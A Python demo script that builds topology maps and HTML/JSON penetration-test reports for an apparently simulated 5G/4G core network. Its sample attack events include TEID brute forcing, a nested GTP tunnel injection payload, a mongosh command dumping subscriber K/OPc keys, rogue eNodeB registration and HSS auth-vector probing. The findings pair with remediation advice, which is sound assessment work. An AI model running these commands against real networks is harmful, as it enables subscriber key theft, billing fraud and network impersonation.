#!/usr/bin/env python3
from reporting.visualization import (
    NetworkVisualizer, TopologyMapper, NetworkNode, NetworkLink, 
    NodeType, LinkType, AttackEvent
)
 
mapper = TopologyMapper()

upf_events = [
    AttackEvent(
        timestamp='2025-12-28 18:00:01',
        phase='Reconnaissance',
        technique='Port Scan',
        command='nmap -sU -p 2152 10.0.0.10',
        response='2152/udp open gtp-u',
        success=True,
        evidence={'ports_found': [2152]}
    ),
    AttackEvent(
        timestamp='2025-12-28 18:00:15',
        phase='Enumeration',
        technique='TEID Brute Force',
        command='python run.py enumerate teid --target 10.0.0.10 --start 0 --end 10000',
        payload='GTP-U Echo Request with TEID=0x00000001-0x00002710',
        response='Found 156 active TEIDs: 0x00000100, 0x00000101, ...',
        success=True,
        evidence={'active_teids': 156, 'response_rate': '15.6%'}
    ),
    AttackEvent(
        timestamp='2025-12-28 18:02:30',
        phase='Exploitation',
        technique='Nested Tunnel Injection',
        command='python run.py attack billing --upf 10.0.0.10 --teid 256',
        payload='IP(dst="10.0.0.10")/UDP(dport=2152)/GTPHeader(teid=0x100)/IP(dst="10.45.0.1")/UDP()/"malicious"',
        response='Packet accepted, no validation on inner TEID',
        success=True,
        evidence={'billing_bypass': True, 'bytes_injected': 1024}
    )
]

nrf_events = [
    AttackEvent(
        timestamp='2025-12-28 18:05:00',
        phase='Reconnaissance',
        technique='Service Discovery',
        command='curl http://10.0.0.30:80/nnrf-disc/v1/nf-instances',
        response='{"nfInstances": [{"nfType": "AMF"}, {"nfType": "SMF"}...]}',
        success=True,
        evidence={'nf_count': 5}
    ),
    AttackEvent(
        timestamp='2025-12-28 18:05:30',
        phase='Enumeration',
        technique='MongoDB Port Probe',
        command='mongosh --host 10.0.0.30 --port 27017',
        response='{"databases": ["open5gs", "subscribers"]}',
        success=True,
        evidence={'databases': ['open5gs', 'subscribers']}
    ),
    AttackEvent(
        timestamp='2025-12-28 18:06:00',
        phase='Exfiltration',
        technique='Subscriber Key Extraction',
        command='mongosh open5gs --eval "db.subscribers.find()"',
        payload='db.subscribers.find({})',
        response='001010123456789 | K=465B5CE8... | OPc=E8ED289D...',
        success=True,
        evidence={'keys_extracted': 156}
    )
]

mme_events = [
    AttackEvent(
        timestamp='2025-12-28 18:10:00',
        phase='Reconnaissance',
        technique='S1AP Port Scan',
        command='nmap -sS -p 36412 10.0.0.40',
        response='36412/tcp open s1ap',
        success=True
    ),
    AttackEvent(
        timestamp='2025-12-28 18:10:30',
        phase='Exploitation',
        technique='Rogue eNodeB Registration',
        command='python run.py lte rogue-enb --mme 10.0.0.40',
        payload='S1SetupRequest(global_enb_id=0x12345, tac=0x0001)',
        response='S1SetupResponse(mme_name="MME01")',
        success=True,
        evidence={'mme_accepted': True, 'cell_registered': True}
    ),
    AttackEvent(
        timestamp='2025-12-28 18:11:00',
        phase='Lateral Movement',
        technique='HSS Diameter Query via MME',
        command='python run.py lte hss-probe --hss 10.0.0.50',
        payload='Authentication-Information-Request(imsi="001010123456789")',
        response='Authentication-Information-Answer with RAND, AUTN, XRES, KASME',
        success=True,
        evidence={'auth_vectors_obtained': 5}
    )
]

hss_events = [
    AttackEvent(
        timestamp='2025-12-28 18:12:00',
        phase='Enumeration',
        technique='IMSI Timing Attack',
        command='python run.py lte imsi-enum --hss 10.0.0.50 --range 001010000000000-001010999999999',
        payload='ULR probes with varying IMSIs',
        response='Timing variance detected: valid IMSI responds 2.3ms faster',
        success=True,
        evidence={'valid_imsis_found': 23, 'timing_delta_ms': 2.3}
    )
]

mapper.add_node(NetworkNode(
    id='upf1', ip='10.0.0.10', node_type=NodeType.UPF, 
    label='UPF (Compromised)', ports=[2152], 
    vulnerabilities=['TEID enumeration', 'No rate limiting', 'Nested tunnel injection'], 
    metadata={'attacks': 3, 'last_scan': '2025-12-28 18:00'}, 
    attack_events=upf_events
))
mapper.add_node(NetworkNode(
    id='smf1', ip='10.0.0.20', node_type=NodeType.SMF, 
    label='SMF (Compromised)', ports=[8805, 80], 
    vulnerabilities=['Session hijack', 'Unauthenticated PFCP'], 
    metadata={'sessions_hijacked': 3}
))
mapper.add_node(NetworkNode(
    id='amf1', ip='10.0.0.5', node_type=NodeType.AMF, 
    label='AMF (Vulnerable)', ports=[38412, 80], 
    vulnerabilities=['Weak NAS encryption (EEA0)'], 
    metadata={'encryption': 'EEA0 fallback'}
))
mapper.add_node(NetworkNode(
    id='nrf1', ip='10.0.0.30', node_type=NodeType.NRF, 
    label='NRF/UDM (Critical)', ports=[80, 27017], 
    vulnerabilities=['MongoDB exposed', 'No authentication', '156 keys extracted'], 
    metadata={'keys_extracted': 156, 'subscribers': 156}, 
    attack_events=nrf_events
))
mapper.add_node(NetworkNode(
    id='mme1', ip='10.0.0.40', node_type=NodeType.UNKNOWN, 
    label='MME (4G)', ports=[36412, 2123], 
    vulnerabilities=['Rogue eNodeB acceptance', 'No certificate validation'], 
    metadata={'protocol': 'S1AP', 'generation': '4G LTE'}, 
    attack_events=mme_events
))
mapper.add_node(NetworkNode(
    id='hss1', ip='10.0.0.50', node_type=NodeType.UNKNOWN, 
    label='HSS (4G)', ports=[3868], 
    vulnerabilities=['IMSI enumeration via timing', 'Auth vector extraction'], 
    metadata={'protocol': 'Diameter', 'imsis_leaked': 23},
    attack_events=hss_events
))
mapper.add_node(NetworkNode(
    id='gnb1', ip='10.0.0.100', node_type=NodeType.GNODEB, 
    label='gNodeB', ports=[38412, 2152], 
    metadata={'cell_id': '0x1234', 'plmn': '001-01'}
))
mapper.add_node(NetworkNode(
    id='enb1', ip='10.0.0.101', node_type=NodeType.UNKNOWN, 
    label='eNodeB (4G)', ports=[36412, 2152], 
    metadata={'cell_id': '0x5678', 'generation': '4G LTE'}
))
mapper.add_node(NetworkNode(
    id='ue1', ip='10.45.0.1', node_type=NodeType.UE, 
    label='Victim UE', 
    metadata={'imsi': '001010123456789', 'status': 'Connected'}
))
mapper.add_node(NetworkNode(
    id='attacker', ip='192.168.1.100', node_type=NodeType.ATTACKER, 
    label='Attacker', 
    metadata={'attacks_launched': 12, 'success_rate': '75%'}
))

mapper.add_link(NetworkLink(source='ue1', target='gnb1', link_type=LinkType.NAS, label='NAS'))
mapper.add_link(NetworkLink(source='gnb1', target='amf1', link_type=LinkType.NGAP, port=38412, label='NGAP'))
mapper.add_link(NetworkLink(source='gnb1', target='upf1', link_type=LinkType.GTPU, port=2152, label='GTP-U', is_compromised=True))
mapper.add_link(NetworkLink(source='amf1', target='smf1', link_type=LinkType.SBI, port=80, label='SBI'))
mapper.add_link(NetworkLink(source='smf1', target='upf1', link_type=LinkType.PFCP, port=8805, label='PFCP', is_compromised=True))
mapper.add_link(NetworkLink(source='amf1', target='nrf1', link_type=LinkType.SBI, port=80, label='SBI'))
mapper.add_link(NetworkLink(source='smf1', target='nrf1', link_type=LinkType.SBI, port=80, label='SBI'))
mapper.add_link(NetworkLink(source='enb1', target='mme1', link_type=LinkType.UNKNOWN, port=36412, label='S1AP', is_compromised=True))
mapper.add_link(NetworkLink(source='mme1', target='hss1', link_type=LinkType.UNKNOWN, port=3868, label='Diameter', is_compromised=True))
mapper.add_link(NetworkLink(source='attacker', target='upf1', link_type=LinkType.GTPU, label='TEID Attack', is_compromised=True))
mapper.add_link(NetworkLink(source='attacker', target='nrf1', link_type=LinkType.UNKNOWN, label='MongoDB Access', is_compromised=True))
mapper.add_link(NetworkLink(source='attacker', target='mme1', link_type=LinkType.UNKNOWN, label='Rogue eNB', is_compromised=True))

visualizer = NetworkVisualizer()
topo_out = visualizer.generate_html(
    mapper, 
    'demo_topology.html',
    title='5G/4G Security Assessment - Forensic Report',
    target_network='10.0.0.0/24',
    analyst='Security Team'
)
print(f'Topology report generated: {topo_out}')

from reporting.html_report import (
    ReportGenerator, AttackResult, AttackEvent as HtmlAttackEvent,
    Finding, SeverityLevel, ScanResult
)

report = ReportGenerator()
report.set_metadata(
    title="5G/4G Core Network Security Assessment",
    assessment_type="Penetration Test",
    target_network="10.0.0.0/24",
    start_time="2025-12-28 18:00:00",
    end_time="2025-12-28 19:30:00"
)

report.add_scan_result(ScanResult(
    target="10.0.0.10", port=2152, service="GTP-U", state="open",
    banner="GTP-U User Plane", vulnerabilities=["No rate limiting"]
))
report.add_scan_result(ScanResult(
    target="10.0.0.30", port=27017, service="MongoDB", state="open",
    banner="MongoDB 4.4", vulnerabilities=["No authentication", "Exposed to network"]
))
report.add_scan_result(ScanResult(
    target="10.0.0.40", port=36412, service="S1AP", state="open",
    banner="MME S1 Interface", vulnerabilities=["No certificate validation"]
))

upf_attack_events = [
    HtmlAttackEvent(
        timestamp='2025-12-28 18:00:01', phase='Reconnaissance', technique='Port Scan',
        command='nmap -sU -p 2152 10.0.0.10', response='2152/udp open gtp-u',
        success=True, evidence={'ports_found': [2152]}
    ),
    HtmlAttackEvent(
        timestamp='2025-12-28 18:00:15', phase='Enumeration', technique='TEID Brute Force',
        command='python run.py enumerate teid --target 10.0.0.10 --start 0 --end 10000',
        payload='GTP-U Echo Request with TEID=0x00000001-0x00002710',
        response='Found 156 active TEIDs: 0x00000100, 0x00000101, ...',
        success=True, evidence={'active_teids': 156}
    ),
    HtmlAttackEvent(
        timestamp='2025-12-28 18:02:30', phase='Exploitation', technique='Nested Tunnel Injection',
        command='python run.py attack billing --upf 10.0.0.10 --teid 256',
        payload='IP/UDP/GTP/IP/UDP/malicious_data',
        response='Packet accepted, no inner TEID validation',
        success=True, evidence={'billing_bypass': True, 'bytes_injected': 1024}
    )
]

report.add_attack_result(AttackResult(
    attack_type="UPF TEID Enumeration & Billing Fraud",
    target="10.0.0.10",
    success=True,
    timestamp="2025-12-28 18:00:01",
    duration=152.5,
    details={
        "TEIDs discovered": 156,
        "Billing bypass": "Successful",
        "Data injected": "1024 bytes"
    },
    findings=[
        Finding(
            title="TEID Enumeration Possible",
            severity=SeverityLevel.HIGH,
            description="UPF responds to GTP-U echo requests with sequential TEIDs",
            affected_component="UPF (10.0.0.10)",
            evidence="156 active TEIDs discovered via brute force",
            remediation="Implement TEID randomization and rate limiting"
        ),
        Finding(
            title="Nested Tunnel Injection",
            severity=SeverityLevel.CRITICAL,
            description="Inner GTP tunnel not validated, allowing billing fraud",
            affected_component="UPF (10.0.0.10)",
            evidence="Malicious data injected via nested tunnel",
            remediation="Validate inner tunnel TEIDs, implement DPI"
        )
    ],
    attack_events=upf_attack_events
))

nrf_attack_events = [
    HtmlAttackEvent(
        timestamp='2025-12-28 18:05:00', phase='Reconnaissance', technique='Service Discovery',
        command='curl http://10.0.0.30:80/nnrf-disc/v1/nf-instances',
        response='{"nfInstances": [{"nfType": "AMF"}, ...]}',
        success=True
    ),
    HtmlAttackEvent(
        timestamp='2025-12-28 18:06:00', phase='Exfiltration', technique='Key Extraction',
        command='mongosh open5gs --eval "db.subscribers.find()"',
        payload='db.subscribers.find({})',
        response='156 subscriber records with K/OPc keys',
        success=True, evidence={'keys_extracted': 156}
    )
]

report.add_attack_result(AttackResult(
    attack_type="MongoDB Key Extraction",
    target="10.0.0.30",
    success=True,
    timestamp="2025-12-28 18:05:00",
    duration=78.2,
    details={
        "Database accessed": "open5gs",
        "Collections": "subscribers",
        "Keys extracted": 156
    },
    findings=[
        Finding(
            title="MongoDB Exposed Without Authentication",
            severity=SeverityLevel.CRITICAL,
            description="MongoDB accessible without credentials, subscriber keys extracted",
            affected_component="NRF/UDM (10.0.0.30)",
            evidence="156 subscriber K/OPc keys extracted",
            remediation="Enable MongoDB authentication, restrict network access"
        )
    ],
    attack_events=nrf_attack_events
))

mme_attack_events = [
    HtmlAttackEvent(
        timestamp='2025-12-28 18:10:00', phase='Reconnaissance', technique='S1AP Port Scan',
        command='nmap -sS -p 36412 10.0.0.40', response='36412/tcp open s1ap', success=True
    ),
    HtmlAttackEvent(
        timestamp='2025-12-28 18:10:30', phase='Exploitation', technique='Rogue eNodeB',
        command='python run.py lte rogue-enb --mme 10.0.0.40',
        payload='S1SetupRequest(global_enb_id=0x12345)',
        response='S1SetupResponse accepted',
        success=True, evidence={'mme_accepted': True}
    ),
    HtmlAttackEvent(
        timestamp='2025-12-28 18:11:00', phase='Lateral Movement', technique='HSS Query',
        command='python run.py lte hss-probe --hss 10.0.0.50',
        payload='AIR(imsi="001010123456789")',
        response='Auth vectors obtained',
        success=True, evidence={'auth_vectors': 5}
    )
]

report.add_attack_result(AttackResult(
    attack_type="4G Rogue eNodeB Attack",
    target="10.0.0.40",
    success=True,
    timestamp="2025-12-28 18:10:00",
    duration=120.0,
    details={
        "MME accepted rogue eNB": True,
        "Certificate validation": "None",
        "HSS accessed": True
    },
    findings=[
        Finding(
            title="Rogue eNodeB Acceptance",
            severity=SeverityLevel.CRITICAL,
            description="MME accepts S1 connections without certificate validation",
            affected_component="MME (10.0.0.40)",
            evidence="Rogue eNodeB registered successfully",
            remediation="Implement mutual TLS for S1 interface"
        )
    ],
    attack_events=mme_attack_events
))

html_out = report.generate_html("demo_report.html")
json_out = report.generate_json("demo_report.json")
print(f'HTML report generated: {html_out}')
print(f'JSON report generated: {json_out}')

